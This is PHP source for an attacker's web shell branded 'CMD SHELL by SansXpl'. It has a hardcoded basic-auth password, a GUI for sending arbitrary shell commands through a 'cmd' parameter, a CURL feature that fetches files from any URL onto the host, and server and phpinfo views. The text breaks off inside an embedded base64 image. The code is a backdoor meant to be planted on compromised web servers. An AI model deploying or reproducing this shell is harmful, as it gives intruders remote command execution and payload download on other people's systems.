<?php
$user = "not";
	$pass = "me";

	if (($_SERVER["PHP_AUTH_USER"] != $user) || (($_SERVER["PHP_AUTH_PW"]) != $pass))
	{
		header("WWW-Authenticate: Basic realm=\"Login\"");
		header("HTTP/1.0 401 Unauthorized");
		exit();
	}


$style = "
<style>
@import url('https://fonts.googleapis.com/css2?family=Courier+Prime&display=swap');
	:root{
		--red:#BE002A;
	}
    html {
        background-color: #111 !important;
        color: var(--red) !important;
		font-family: 'Courier Prime', monospace;

    }

	body {
		background-color: #111 !important;
		overflow: hidden;
		padding:0;
		color: var(--red) !important;
	}

	body::-webkit-scrollbar {
		display: none;
		scroll-behavior: smooth;
	  }

	.hide-scroll::-webkit-scrollbar {
		display: none;
		scroll-behavior: smooth;
	}

	.h td, td.e, td.v, th {
		border-color: var(--red) !important;
		color:#E2E4EF !important;
	}

	.h {
		background-color: transparent !important;
	}

	.v {
		background-color: transparent !important;
	}

	.e {
		background-color: transparent !important;
	}

	.p {
		font-size:2rem;
	}

	td {
		border-color: var(--red) !important;
	}

	@media (prefers-color-scheme: dark)
	.h td, td.e, td.v, th {
		border-color: var(--red) !important;
		color:#E2E4EF !important;
	}

	td {
		border-color: var(--red) !important;
	}

    .center {
        flex-direction: column;
        justify-content: center;
        align-items: center;
        display: flex;
        height: 100vh;
      }

    .center1 {
        flex-direction: column;
        align-items: center;
        display: flex;
      }

	.center2 {
        flex-direction: column;
        align-items: center;
        display: flex;
        height: 100vh;
      }

    a {
		color:var(--red) !important;
		text-decoration:none;
		}

	.font {
		font-size:14px;
		transition: all 0.3s ease;
	}

	@media (max-width: 666px) {
	pre {
		font-size:10px;
		transition: all 0.3s ease;
		}
	}

	.bx-group {
        position: relative;
        margin: 1rem 0;
    }

    .bx {
        text-decoration: none;
        color: var(--red);
        background-color: transparent;
        border: 2px solid var(--red);
        padding: 5px 10px 5px 10px;
    }

    .bx:hover {
        cursor: pointer;
		filter: brightness(70%);
    }

    .bx:focus,
    .bx:valid {
        outline: none;
    }

    ::placeholder {
        color: var(--red);
        opacity: 1;
        /* Firefox */
    }

    ::-ms-input-placeholder {
        /* Edge 12 -18 */
        color: var(--red);
    }

	::-webkit-scrollbar {
		width: 5px;
		opacity: 0.5;
	}

		/* Track */
	::-webkit-scrollbar-track {
		background: transparent;
	}

		/* Handle */
	::-webkit-scrollbar-thumb {
		background: var(--red);
		border-radius: 5px;
	}

		/* Handle on hover */
	::-webkit-scrollbar-thumb:hover {
		filter: brightness(70%);
	}

</style>
";

$banner = "<center><b>
_______                __   __      _
|   ___/  CMD SHELL by  \ \ / /     | |
 \  \    __ _ _ __  ___  \ V / _ __ | |
  \  \  / _` | '_ \/ __| /   \| '_ \| |
 __\  \| (_| | | | \__ \/ /^\ \ |_) | |
/______|\__,_|_| |_|___/\/   \/ .__/|_|
                        | |
    github.com/SANSDESU |_|

</b></center>";


$guiscript = '
<script>
	function runCmd() {
		if(event.keyCode == 13) {
			location.replace(`?login&gui&cmd=`+document.getElementById(`cmd`).value)
		}
	}

	function execCurl() {
		var name = document.getElementById("curl_name").value;
		var url = document.getElementById("curl_url").value;
		location.href = `?login&gui&curl&name=${name}&url=${url}`;
	}

</script>
';

$guibtn = '<div style="margin:0 0 10px 0;"><center><button class="bx" onclick="location.replace(`?login&gui&cmd`)">CMD</button> <button class="bx" onclick="location.replace(`?login&gui&curl`)">CURL</button> <button class="bx" onclick="location.replace(`?login&gui&help`)">Help</button> <button class="bx" onclick="location.replace(`?login&gui&cmd=help`)">Help [cmd]</button> <button class="bx" onclick="location.replace(`?login&gui&server`)">Server</button> <button class="bx" onclick="location.replace(`?login&gui&phpinfo`)">PHP Info</button></center></div>';
$guicmd = '<div style="margin:0 0 10px 0;"><center><input style="width:80%;" type="text" class="bx" placeholder="Command" id="cmd" onkeydown="runCmd()"/> <button class="bx" style="width:18%;" onclick="location.replace(`?login&gui&cmd=`+document.getElementById(`cmd`).value)">Exec</button></center></div>';
$guicurl = '<form onsubmit="execCurl(); return false;" style="margin:0 0 10px 0;"><center><input style="width:35%;" type="text" class="bx" placeholder="File Name" id="curl_name" required/> <input style="width:40%;" type="text" class="bx" placeholder="File Url" id="curl_url" required/> <input type="submit" class="bx" style="width:18%;" value="Exec"></center></form>';

function formatBytes($bytes, $precision = 2) {
	$units = array('B', 'KB', 'MB', 'GB', 'TB');
	$bytes = max($bytes, 0);
	$pow = floor(($bytes ? log($bytes) : 0) / log(1024));
	$pow = min($pow, count($units) - 1);
	$bytes /= (1 << (10 * $pow));
	return round($bytes, $precision) . ' ' . $units[$pow];
}

function getUserIpAddr(){
    $ipas = '';
    if(getenv('HTTP_CLIENT_IP'))
    {
        $ipas = getenv('HTTP_CLIENT_IP');
    } else if(getenv('HTTP_X_FORWARDED_FOR'))
    {
        $ipas = getenv('HTTP_X_FORWARDED_FOR');
    } else if(getenv('HTTP_X_FORWARDED'))
    {
        $ipas = getenv('HTTP_X_FORWARDED');
    } else if(getenv('HTTP_FORWARDED_FOR'))
    {
        $ipas = getenv('HTTP_FORWARDED_FOR');
    }
    else if(getenv('HTTP_FORWARDED'))
    {
        $ipas = getenv('HTTP_FORWARDED');
    }
    else if(getenv('REMOTE_ADDR'))
    {
        $ipas = getenv('REMOTE_ADDR');
    } else {
        $ipas = 'Unknown';
    }
    return $ipas;
}

function getPhpInfo(){
	ob_start();
	phpinfo();
	$info = ob_get_clean();

	$img_to_replace = [
		"data:image/png;base64,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",
		"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPoAAAAvCAYAAADKH9ehAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAEWJJREFUeNrsXQl0VNUZvjNJSAgEAxHCGsNitSBFxB1l0boUW1pp3VAUrKLWKgUPUlEB13K0Yq1alaXWuh5EadWK1F0s1gJaoaCgQDRKBBJDVhKSzPR+zPfg5vLevCUzmZnwvnP+k8ybN3fevfff73/vBAJTHxc+khL5kr6T1ODk5nAgTRTWloghFVtEg/zfh2PkSvq9pJGSKiX9SdKittbJoD/PSYkrJD0vKeB4IsNNotfuUtHk/CM+IvijpF9KGiDpGEkLJZ3lC7qPeKKTpD9IWiDpUOfWPCi61ZeLvD2VIhTwp9QlTjK5NsIXdB/xxHmSpvD/OucWPSAyQw2+LfeG1SbXVra1Tqb785xUaNdMel0g7Iu5V1zPv6dJqpD0kKR/+ILuI55o8oeg1bFT0kWSOkraQxK+oPvw0TZR3ZY758foyQXf//ZxUFh0Q/GEfNf9gHkaJ6m7pHJJSyTt9tnXhxtBR2EGlnHCMbZMaHuHzX19JZ0u6VRJh0k6hM+BpMjnklZIelPSNhff3V5StkNlEWBMFm+3LcC+BW3GuZP2GvfmiEiCCMUzxZIKRGSt9zeML/fdGAW9JB3O8c6SlMZ+b5f0qaQiF7EpnieXY1auvZfG7zhSUk8RSS428F7M5xfsh1eAV/vxOzoq16sklZBqbdpo5H2qDPRQXoP3Ki0+20FSFyrZUgt+Rt/7KH2vZb8/t/iMG2Sy/0dI6sbvgHGoV8a3xErQb5Q0iTfHCplkzlkW7w+VNF3ST7QJUzFK0pVkDFiw+yV95uC7r5Z0k3CW2ApwIkrJ9B9IelfSh2SIlqC/pDFUZAVk0rQoMhk2GYswx+AtWvMKPtcyEckW37pPwsIHNAuBniDpYhEpBMmJwvibJL0gIlVh39r0C8UlczkXQ/mM6OtEzuf3RfPVAxUY47f5PStcGKPxpOMldbbxiBptPMavJX1PuQ/P/olyz12S7rD4PLyqBTQ8gyXVSOot6VK+dxR53wyl7POjkv7pkpcwpleJSCHP4eQjM0BB/ZuG4Hl9EO8mQx4ZQ0FfL+k+k+t4wNlULpkO24IGnSzpQklzKPDRAMvZ1eXz9uXfH/Pvx5Ie44C5zYQXUgDPj6LEnMCQ3AFkjjupjGF9/kJmxPw1oiquz+6dalXcCRSmYxwK0kDSRI71azb3Y+6GiMi6P/5ey3F3YpExjxdQoG61uX8gBetkh2OWFkUIVGUT1pS9yosZNu1nkl8uZH+mikhxkx1wz7mkB0WkXsKJFw1ZuSWKotY9wjNJS6mUy41JK5P0c2qCnBgIeQWZvEK7Dnf6WUljTT5TS7d0KwezkJShdWIeGeuKKJo7FktUQylcl0i6RtL/HH4OjP+wB0UTLTGHfubRDWyi1g7SaoZQ495z9w7RpaHKqHEfLeklEyWzk+7dl3TTu1KQCpV7+pBB4IWstFFAgvOpJnTL6DoW0xPbw3k/nIYkW+kbmHeXhUEABklazrBDBdzTDfyuBo5DPq1eoUk7ZbSk70l6n3MZjUdCDpQvMF/rezn7/hX7Xs8wsj/7rsrWdQxnZtrwwENUosJkDDZxTjOUkEH1ds6lzJyDZzGScRsonGNcMCIG+WgRKTRQ8Su2p7uRi/mlKjZKekREChS2KIOcTvfqp3RZDlM+cxnfv8Thc75Pt8kqo92VzNTbxBqcQlceivAdByHDIxbvFTMOLovyHAGGK3qc/jJDoDc4hpjABzBm4UAglBFqEAOqt8mB29ss4uJnNCHfSK/tVZMYEfMykt7Bcco1eDLDHCT8gmzzRdLHZL6wRSgzg6GIgVl8Xj2uhPA+oQn53yTdK2mVMC8NzuJ8zaSyM/ApxyzWCFJRvUQ3eQ29BTNFcRgt+FTl2g30zDZZtD/ZRMifE5ES6Y9MxqAHQ7XZikI9nd97j5p1f83GZTPr6Crt2sOcOB1zTYT8HrqjVRZx4wbSAt47SXn/YsZV9zp4zuvJgNGQRaszmoN1rBY6IH4dHiVHcA5dZd2zeIbPv8ZBkghYTQFTx/h1WvSz6c3kM5ewGG8Prvxc5DZWS2u+dypnM5Y3sIJMXmbxfXW0misZN56oxITnWsyl2fg+6+C+zWTefMWr68RwaYF271htHBZqCsKqL28wB/ACjYShrE9nUjfWmEU33A7woqbR4k5UlNk4yoYOzOHvtGs30KO1QgnlZC2VohGOIGn7WEvW0ZdoMeCHfBgdo8X++m3V+s2wEHKzJMblJom92+ne2SHDwT1gknUispPpJLrrVZqwLxTmy5F5jOdVS72F/b6UwlbrcEytrD00+a8l/ZUM82jEZd8peu8uNYS8JxNWqis5IYqQCy1rPUULh8Y7fOYal3zzmPb6aJN7zlf+32bBV9ESclNE85WUX4j4oNbl/fM1b2eoxX3jyXNqiDTP4Xe8Rm9ItfSjvAr6DM0d+o5MXW/CuHO0a7eZTLYT3KF9LktYZ/WdCI+IkoV+lFZ6l3J9OF14HdM0F3MrhXxFjJmqhh5FBera24XqxaCqL0UosK97Z2ku+yJaEqf4D62ByoROcjZuN78Xaa9zTBSzKvxvC+vlrmgWVPU2h4j4FCO5lZ+vNBnpYHHfOOX/PfR83eApTaGM8CLop5l88WSLWAOu4AiNme5owcBO1xhlLGO/eGAFkyYqrtFe5zKzqU7KBE5o/BAIiv7VJSK7qV4GhEF1XtSk0YseWl6lWYI+cXj6pigJLkH3Vk0qfebxe4q0JGOGSDxCWn/Nchk9qJgMfGKS87LDes1IHeVW0LszgaC6sPMYE5lBt4CzRcuy4lVMLKlWfWwcJ+YpxtcGjtOYfzRjTgNIlv0rnpyCveeHNFSJ/jUlonH/3nNYqyOU28qYhHOLbzVPqFc81JQDKxnQ5twLdmjfmQzlxU6eoZ/mma3y8D3VonlhUr6bElhMwJ81RseSxW+jfOYULdYGAw5s4WBtpeU0ijKwxnp/HCfn70piCNlMFEUU8/WpmnZe1Bq80r96m5yMkIwx9nnNHTWFs114q0ArM1HsiUY7j5/rKFIThdrrzR7agHyoy9vd3Ag64uEfKa+xjIKlLqtTUBB7FWgJrQ9joFl1d2cQ2wzHaeDXa6/ztO9Wx+OT+FrzSAKuV12ptOZp+ljnaVawk8uxDpnMZXYCGB3PXqe5sl7QQ5ubhhQR9B4mQpvjIR+gJgrbOxV0rK/rVUyXmyRWdI2a2YLEhVP3BwmN9sJ9BtQpKkxiSDOrUeUhaeQaPevKzKQ3oIVTSGatcynoRl29sIkh440a8pURNoz00Ab4Ts1obxCps1FKl8k5IpKbcmsgu6nz6ETQC+iSqoKKOPmVJBmYnDjHX4EozB9s7TgwykkyYS13URAHpmstYIloOP/HEi6Wx5a4+DwSpH2V18tTyHUPm3iQeS1s09ai4/0ntVgNRQmzHTRulGwaQNnei3FgHqPcMBEJlXrNioAaE8AcupKBd7ElBu1uTxCzg+dmKB4TahiQNX/OxssAb00Uzdeci4S3FYhEQdfkWCrc1cI2K+2EDhsP1OUxZGUnOWTmcgphV0UgZ4jUR1hLlBiuJfqJpb61CXimOrq8RqiEeu6TU3iMwdzYgWhUnWHDDKr0ptLar6USqmOfYYiGMMTUN/KgziGVTo+pNJHBBfF0zVAQc6N2DUL+tcO2Yc1Rk2ss+yBmOko43yCSCljJXAWA7PD4eAt6MBy2yiNACRvVVN05t40pPLYPsT+zlRDpOLG/Jt8OSGKhmnBpivV7q/Y6JkucVgkyWKb52rVZwl0tvNDi+AzRvKjfK1Dnjvpd1FhPEc1LBVsbqENXN35cFaPY2BIVGdlWYZKqgPPj/RythNtpcNycpoOxwAae0bGwhAkAQg01cfiDWDRqZtHhCqFQ5FAtOXKXh/Yh6Ci2N5YMUDW2SHg/N3scn02N++cnMIZCBdwS9gtApRxqDc6OlzWtSrdc8cJGlzP5fzZDri1tQNixISWL/5fSQvcVzfe/wzXfSG8Kuw03pHB/t5KMik+EYJ1EC1d0zCw6fofqRI2ZJwpvyxN4uPs0q/6UR2szyESobxatf3aa7jvfrT0DGPNpYV3H3CI0BYLGllQdy7TX14rUP/zzDHpuRp0EPLnJvH68Qij/RXnyIyku5Ea+5S3NO7s01q77eMY1qqY8T7Qs+4qtq+o2UWhjZO6HuWhjJBlZXWbAHvbFSTAxqMW+RbuG3VfviAP36tshujINh6Tr3kE0BNMl5x8Qq6+mVTdwrMlzpRrGaGPzVpw9NDNFngjoFZZzRCS/FRPXHRZT31X2MgfYTQYX1WE1moaaQJfKEFTs/camkXnUwt9YtNWPiuc67VmRlb0yiRgS/cAe7is0QXuTAm9kikM2DNc5OkeGRaMU8tq0TJHbUCOtezMeRfITiSv1PLLbGE5gb/NOB/1AuR1KlLETDltidyR4XIPasyEnc6eIbRa9kfNifFeXJOAnVJBiKfFCvobcLKccLHWojHJpIPH3iXQlpoNLrdcH44sucvmQOHHjZ9rDrGdbixVmbk/XGy4mtiKuoQDjmQpFJLs6wuSZvqKmL0ky6zOZLry+420UKUaue5ooyeqy9+iopgM989cp1Dcp16bSU1tOJbyFyjedTID5wOk6OAUFFXUDKFRLkmBM3xH7fzIJwPLsxexDMWP2b8g38DqN45ywCuH0VNuv+XmjwOYCjtUakbg6AkGlNoQGBMB5A9g8hh2g7zFE2U4F35FxfHfmwwbxcz3Yl32C/oAwPwDAS6UXdpOhXPZ27Trc9R/SLTla0zzGoXl2QAexnLVZJB/CZMpV7HthfL4lJIrb54u+tdv3/rCiSbw+k88yM9ZxXgKwlHmZycq13iSr0KeMHmUZw6r1VICrLT4D5fy4wq/5DAvfjaWC9oAd9KxwTNUJynUjL+EqpwSTME1zOWMBuIxmZ7p9RCsNq+NmdxW09I1MdNkJeYZNHsIt0qKEO2Z4kvmHadS+Xqv2cqzc93rpuhdl54tg2DISuJljBW3uZjMHrAPqHOYK6zPIM23G2+14Rts4cyLbdxo3Y667UskOo/W/m/PwRhQBwZFkT2vXzDbTtLMZCyfP1155bbfDrpjKZoYH41bO+d97jmEgMPVxFMF0iHESIkiNtDhKuwV058cw0dBZNP+lFsSU/6VWf0E4P/x+IF2eJnokr4uW/2jAKPYjjRb7Cxef70c3qsCl0im1Gj/Uu2eF6sWo0rUiTQq7zS+pYjywnXYwcyOZfI4mKgHj9N2ttHqbRfSlQXhjw5XXy4S7ZbzOovkxVRsphHp8ia3HlyleZS1zHcvoVrdjuNFdEe7edGHzSbpSria/WZ3+cxYV5DCx/4w7FUfyfTW0WO+i7x2YrzKUXZFw/sut+OxJDGkHUxEZPwgCquQcIgxZR9oXekDQk8FF60bqwocupaIoEz6EmaC3C+0Ro6Wgp4eb2tpPJqN+4xXFXQ3TfUfCc5PDNnLZDpLIV1NADKyjZa87mHgmWX57bYdIfIY3pdCGf43xQUXI62kBn3fZxi4SPC8crIjDQ4yzFAaz/XcPJn7xf03VRzIB5Z7qCbBzPQi5jga2E9bCD+ELug8ficEZCk/Cmj8Ro3aLtLxDR1/QffhIHNRTUZCf+S5G7SJBp2b7G31B9+EjcVAFEInZQ2LU7jiN1zf4gu7DR+KwTvkfO9bGx6BNnEQ8XXmN5cT3fEH34SNxwN4A9dgknIEwyWNbeRTwV7WYHBVwFQfbwKb7vOUjiYAiKVT1PczXqCLD/n5UbuLcNxTKoCgExSFNmsFCHI6iJBQFnUbqqbWPHyFceDAOrC/oPpIN+FVaVLrNUa6dLPbvoEQdO4pd1OUylBVkCutsOkqosbNvwcE6qL6g+0hG3MY4ejots1pT3kE4P9QDdfuLKeDfHswD6gu6j2TF2yQcLoqEGurre9EdP1QTfmxJRdn0NlrvD+jmY69Egz+UQvxfgAEALJ4EcRDa/toAAAAASUVORK5CYII="
	];

	$url_to_replace = [
		"http://www.php.net/",
		"http://www.zend.com/"
	];
	// Extract important sections
	$sections_to_hide = [
		"IC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"DTD/xhtml1-transitional.dtd\">",
		"Configuration"
	];

	$SansXplImg = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAygSURBVHhe1ZsLeFNFFoBPkubVJk2blvKUtiC2BXkVKaCCIlpdwE9gFfGFglC0oJ+oLAusCK7rgvgAWdEV1IqURaEojwKCWLYoL0HqAwXlUUSgQGmbNu+kyZ4z96ZN2+Tm5tHH/t83ODM33s6cmTlzzpm5Emh+umEajKkfpnSpBJIT4qTt4zRSnVIpUWGd22Z32wxGV1V5lavM5YJSrDuOqQTTAUxnMTUbzSEAKaZhmO6NVklGZfVWpAzuo4B+aXJIS42Crh1koJD7/rMOpxt+v1gLx884oeSEAw78YIeDP9pPWazubfh4A6avMbnot5EikgJIwJQTo5bk3H2LKmXc7Wq4daAS1Mrw/oTF5oaiQzYo+NIChcXWUpPF/R5WU7rKfhAmkRAAdXx2SmdZbu79mpiHRkVDbExzTCwAXCawZqsF3vnUaDp7oXYFVi3GFJYgwmmpDNP0zkmyBXOmaOOp41FU0wLQUiFB/PP9mqqLV2pfxKq3MdWyh0ESqgAy5DLIm/GgJmv2ZC3gtOerWxaj2Q2L3q+BFeuMhxy18ChWkfIMilBaPvm65KjlKxfER2dmyPmq1uXIzw6YurDS/NtZ53Qs5nG14ghm0kZhWj52hPrlDa8nyJM7tdB8F0GndjLAJSg/da52DO4giVi1E5ObPQyA2F6oMRXgdH/ojVk6UCpaZ8oLQVvr2NvUUOuCrG9K7H2x6nNMTvZQADECUEsksOW153R3PTtRA5hvs1DbbrlBCfGx0vQvD9iysIpsB0EhBBIATfsC6vy0+2K4GpH8etYJM5cY4OQ5JwzpqwxJcOWVLnj+dQP897ANbuqvBHmUuJcM7KWAOK20+64Dtt5YXI/J73IIJIDlNO1p5IOBtPOIqeVkxWHj7YAWIQpBwT8VhxubPG7mVTJ+4PAxB5y/VAt330orURwDr1eAw+FO3/e9XY/F7VxtU8hs9cdkXFO586Zq+aJ4VhaY4FxZ/ba8JK8GakyidFIdX+yzwr4SO18CWLfDAr+cDrikGzD/iVgUmmoGZidxNU3xJ4CMHrjVrfhbXEhTd+02M5/joM5v3mPhS+LIL2z4e5oRjd8bCGr7uy/EQ7drov6FxXSutiG+BCAjI2cV7vOa6OB7fw6nKjkzjdl90MbnAoM